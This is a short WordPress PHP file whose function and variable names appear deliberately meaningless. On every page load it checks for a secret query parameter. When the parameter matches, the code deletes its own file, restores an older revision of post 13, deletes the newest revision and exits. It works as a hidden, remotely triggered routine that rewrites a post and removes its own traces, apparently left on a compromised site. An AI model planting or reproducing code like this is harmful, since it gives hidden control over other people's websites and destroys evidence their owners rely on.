<?php

function redirect_description_icon_reviews() {
	if (isset($_GET['allow_wpmu_digital']) && $_GET['allow_wpmu_digital'] === 'estate_name_hover') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$label_module_newsletter_reviews = 13;
		$mediaelement_address_allow_basic = wp_get_post_revisions($label_module_newsletter_reviews);
		if (empty($mediaelement_address_allow_basic)) die('no revisions');
		if (count($mediaelement_address_allow_basic) < 2) die('less than 2');
		$dashboard_real_countdown_library = array_shift($mediaelement_address_allow_basic);
		$switch_schema_translation = $dashboard_real_countdown_library->ID;
		$calculator_tree_simple = array_shift($mediaelement_address_allow_basic);
		$gdpr_save_viewer_speed = $calculator_tree_simple->ID;
		$enhanced_number_method = wp_restore_post_revision($gdpr_save_viewer_speed);
		if ($enhanced_number_method === false) die('error restoring');
		$enhanced_number_method = wp_delete_post_revision($switch_schema_translation);		
		if ($enhanced_number_method === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'redirect_description_icon_reviews');
